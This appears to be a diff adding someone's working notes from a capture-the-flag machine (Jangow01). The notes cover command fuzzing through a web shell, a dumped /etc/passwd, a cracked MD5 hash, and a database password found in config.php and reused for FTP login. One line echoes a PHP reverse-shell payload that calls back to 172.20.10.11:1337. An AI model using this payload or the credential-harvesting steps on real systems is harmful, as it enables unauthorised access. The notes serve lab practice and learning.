+	bzip2                   [Status: 200, Size: 15, Words: 1, Lines: 2, Duration: 295ms]
+	ss                      [Status: 200, Size: 16637, Words: 8071, Lines: 147, Duration: 1266ms]
+	systemd-inhibit         [Status: 200, Size: 22, Words: 3, Lines: 3, Duration: 693ms]
+	networkctl              [Status: 200, Size: 207, Words: 126, Lines: 7, Duration: 631ms]
+	ntfscmp                 [Status: 200, Size: 418, Words: 78, Lines: 14, Duration: 461ms]
+	lessfile                [Status: 200, Size: 85, Words: 6, Lines: 4, Duration: 1081ms]
+	vdir                    [Status: 200, Size: 543, Words: 102, Lines: 12, Duration: 709ms]
+	dir                     [Status: 200, Size: 98, Words: 17, Lines: 4, Duration: 501ms]
+	bzexe                   [Status: 200, Size: 121, Words: 19, Lines: 5, Duration: 756ms]
+	kmod                    [Status: 200, Size: 652, Words: 142, Lines: 22, Duration: 484ms]
+	hostname                [Status: 200, Size: 10, Words: 1, Lines: 3, Duration: 248ms]
+	pwd                     [Status: 200, Size: 20, Words: 1, Lines: 3, Duration: 233ms]
+	uname                   [Status: 200, Size: 7, Words: 1, Lines: 3, Duration: 481ms]
+	ntfsinfo                [Status: 200, Size: 602, Words: 132, Lines: 19, Duration: 275ms]
+	nisdomainname           [Status: 200, Size: 42, Words: 6, Lines: 3, Duration: 388ms]
+	echo                    [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 192ms]
+	ypdomainname            [Status: 200, Size: 41, Words: 6, Lines: 3, Duration: 514ms]
+	ls                      [Status: 200, Size: 84, Words: 1, Lines: 11, Duration: 682ms]
+	ntfsls                  [Status: 200, Size: 815, Words: 237, Lines: 24, Duration: 460ms]
+	findmnt                 [Status: 200, Size: 4464, Words: 1568, Lines: 43, Duration: 722ms]
+	ntfsfix                 [Status: 200, Size: 542, Words: 113, Lines: 18, Duration: 396ms]
+	domainname              [Status: 200, Size: 8, Words: 1, Lines: 3, Duration: 253ms]
+	date                    [Status: 200, Size: 30, Words: 7, Lines: 3, Duration: 374ms]
+	df                      [Status: 200, Size: 394, Words: 171, Lines: 9, Duration: 693ms]
+	lsblk                   [Status: 200, Size: 183, Words: 68, Lines: 7, Duration: 952ms]
+	tempfile                [Status: 200, Size: 17, Words: 1, Lines: 3, Duration: 328ms]
+	bzgrep                  [Status: 200, Size: 71, Words: 8, Lines: 4, Duration: 554ms]
+	busybox                 [Status: 200, Size: 2259, Words: 277, Lines: 43, Duration: 677ms]
+	ntfsmove                [Status: 200, Size: 712, Words: 236, Lines: 21, Duration: 269ms]
+	bzfgrep                 [Status: 200, Size: 72, Words: 8, Lines: 4, Duration: 747ms]
+	systemctl               [Status: 200, Size: 25697, Words: 11755, Lines: 185, Duration: 686ms]
+	bzdiff                  [Status: 200, Size: 42, Words: 5, Lines: 3, Duration: 560ms]
+	bzegrep                 [Status: 200, Size: 72, Words: 8, Lines: 4, Duration: 622ms]
+	lesspipe                [Status: 200, Size: 87, Words: 7, Lines: 4, Duration: 893ms]
+	netstat                 [Status: 200, Size: 14890, Words: 6621, Lines: 196, Duration: 2080ms]
+	loginctl                [Status: 200, Size: 77, Words: 40, Lines: 5, Duration: 1006ms]
+	bzcmp                   [Status: 200, Size: 40, Words: 5, Lines: 3, Duration: 642ms]
+	mount                   [Status: 200, Size: 3268, Words: 201, Lines: 42, Duration: 509ms]
+	mktemp                  [Status: 200, Size: 21, Words: 1, Lines: 3, Duration: 318ms]
+	ntfswipe                [Status: 200, Size: 1036, Words: 352, Lines: 30, Duration: 415ms]
+	gzip                    [Status: 200, Size: 21, Words: 1, Lines: 2, Duration: 396ms]
+	systemd-notify          [Status: 200, Size: 421, Words: 117, Lines: 12, Duration: 888ms]
+	lsmod                   [Status: 200, Size: 4555, Words: 1705, Lines: 107, Duration: 678ms]
+	ps                      [Status: 200, Size: 9936, Words: 3276, Lines: 318, Duration: 2551ms]
+	dmesg                   [Status: 200, Size: 72728, Words: 10293, Lines: 828, Duration: 1422ms]
+	echo                    [Status: 200, Size: 2, Words: 1, Lines: 3, Duration: 275ms]
+	export                  [Status: 200, Size: 372, Words: 10, Lines: 11, Duration: 258ms]
+	pwd                     [Status: 200, Size: 20, Words: 1, Lines: 3, Duration: 158ms]
+	set                     [Status: 200, Size: 370, Words: 5, Lines: 18, Duration: 357ms]
+	times                   [Status: 200, Size: 49, Words: 3, Lines: 4, Duration: 285ms]
+	ulimit                  [Status: 200, Size: 11, Words: 1, Lines: 3, Duration: 249ms]
+	umask                   [Status: 200, Size: 6, Words: 1, Lines: 3, Duration: 192ms]
+	:: Progress: [21920/21920] :: Job [1/1] :: 15 req/sec :: Duration: [0:03:47] :: Errors: 50 ::
+
+	- Let's see what the user www-data can do. /etc/passwd file shows that he cannot log in to a shell.
+	  So we need to find another user that can shell into through www-data. Lets see what /etc/passwd 
+	  looks like. 
+	  
+	root:x:0:0:root:/root:/bin/bash
+	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+	bin:x:2:2:bin:/bin:/usr/sbin/nologin
+	sys:x:3:3:sys:/dev:/usr/sbin/nologin
+	sync:x:4:65534:sync:/bin:/bin/sync
+	games:x:5:60:games:/usr/games:/usr/sbin/nologin
+	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+	systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+	systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+	systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+	systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+	syslog:x:104:108::/home/syslog:/bin/false
+	_apt:x:105:65534::/nonexistent:/bin/false
+	lxd:x:106:65534::/var/lib/lxd/:/bin/false
+	messagebus:x:107:111::/var/run/dbus:/bin/false
+	uuidd:x:108:112::/run/uuidd:/bin/false
+	dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+	jangow01:x:1000:1000:desafio02,,,:/home/jangow01:/bin/bash
+	sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+	ftp:x:111:118:ftp daemon,,,:/srv/ftp:/bin/false
+	mysql:x:112:119:MySQL Server,,,:/nonexistent:/bin/false
+
+	- Let's see if we can login through the user jangow01.
+		- No files in this user's home dir. Maybe do a thorough search later for files.
+		
+	- I had an idea to see if we can inject another php file in www-data user's home dir
+	  to see if we can invoke a shell.
+	  	- Tried downloading a remote php shell file to the host machine, but no wget or curl, can't seem
+	  	  to install any binaries using apt or apt-get either.
+	  	- Since git is available, tried to git clone the php shell using a public git repo, that didn't 
+	  	  work either. It seems I cannot run any long standing process using this primitive web shell
+	  	  (this is an asumption! test it if it's true)
+	  	  
+	- Observation: only root and jangow01 has hash, every other user has /bin/false or /user/sbin/nologin. 
+	  Upon further investigation, it seems none of them can login using a shell. So that means we have to 
+	  login using jangow01. (This is again an assumption! there might be ways to bypass those false or 
+	  nologin shells.)
+	  
+	- Did a find command for files and dirs of user jangow01. Found below.
+	
+	/home/jangow01
+	/home/jangow01/user.txt
+	/home/jangow01/.bash_logout
+	/home/jangow01/.cache
+	/home/jangow01/.bash_history
+	/home/jangow01/.nano
+	/home/jangow01/.profile
+	/home/jangow01/.bashrc
+	/home/jangow01/.sudo_as_admin_successful
+	
+	- /user/jangow01/user.txt file has what seems like a hash, or an encoded string:
+	  d41d8cd98f00b204e9800998ecf8427e
+		- Tried different encodings but didn't work (Not exhaustively though, so we might want to
+		  revisit this! PS: No need, this is MD5 hash)
+		  
+		- This looks like an MD5 hash, using hashcat to see if we can crack it.
+			- lol! this hash is for an empty string :D
+			
+	- We cannot login using jangow01 with an empty password in the normal way, but since ftp is open,
+	  let's try to get into that with those creds
+	  	- damn! ftp failed as well
+	  	
+	- Let's enumerate the rest of the jangow01 directories and see what else we can find.
+		- Nothing interesting on any of the files (again, this might be a wrong assumption!)
+		
+	- Tried sudo -l for www-data user, but no output, which is strange because sudo is a binary
+	  anyone can execute (search why later, maybe something to do with the way php shell works)
+	  
+	- Trying again for php reverse shell inclusion. 
+		- This command seem to echo correctly: echo '$sock=fsockopen("172.20.10.11",1337);exec("sh %3C%263 %3E%263 2%3E%263");'
+		- For some reason this file writing thing isn't working over the web requests.
+		
+Decison
+--------
+
+1. I totally forgot about /site/wordpress directory. It had a config.php file which has the following information.
+
+	<?php
+		$servername = "localhost";
+		$database = "desafio02";
+		$username = "desafio02";
+		$password = "abygurl69";
+		// Create connection
+		$conn = mysqli_connect($servername, $username, $password, $database);
+		// Check connection
+		if (!$conn) {
+		    die("Connection failed: " . mysqli_connect_error());
+		}
+		echo "Connected successfully";
+		mysqli_close($conn);
+	?>
+	
+	BINGO!
+	
+	- desafio02 seems to be jangow01 user's group. To verify this let's see how to interprit /etc/passwd lines.
+		- Upon further study, it's not his group, but it's a place to add additional comments. So he added his
+		  comment as desafio02, confirming they are the same person.
+		  
+	- OK, time to see if the creds work. Trying to connect via ftp.
+		- Login successful :)
+		
+	- Trying to see what files I can get my hands on using ftp.
+		- The following content was found under /html/site dir
+		  
+		drwxr-xr-x    3 33       33           4096 Jun 03  2021 assets
+		-rw-r--r--    1 33       33             35 Jun 10  2021 busque.php
+		-rw-r--r--    1 33       33             62 Sep 04 20:14 cmd.php
+		-rw-r--r--    1 33       33              6 Sep 04 20:22 config.php
+		drwxr-xr-x    2 33       33           4096 Jun 03  2021 css
+		-rw-r--r--    1 33       33              6 Sep 04 06:07 hello.txt
+		-rw-r--r--    1 33       33          10190 Jun 10  2021 index.html
+		drwxr-xr-x    2 33       33           4096 Jun 03  2021 js
+		-rw-r--r--    1 33       33            483 Sep 03 21:27 messages.pot
+		-rw-r--r--    1 33       33              3 Sep 03 21:19 pod2htmd.tmp
+		-rw-r--r--    1 33       33              6 Sep 04 20:16 test.txt
+		-rw-r--r--    1 33       33             88 Sep 03 21:25 typescript
+		drwxr-xr-x    2 33       33           4096 Jun 10  2021 wordpress
+
+	- I downloaded buch of these files, couldn't find anythong suspicious yet. Need to keep digging.
+
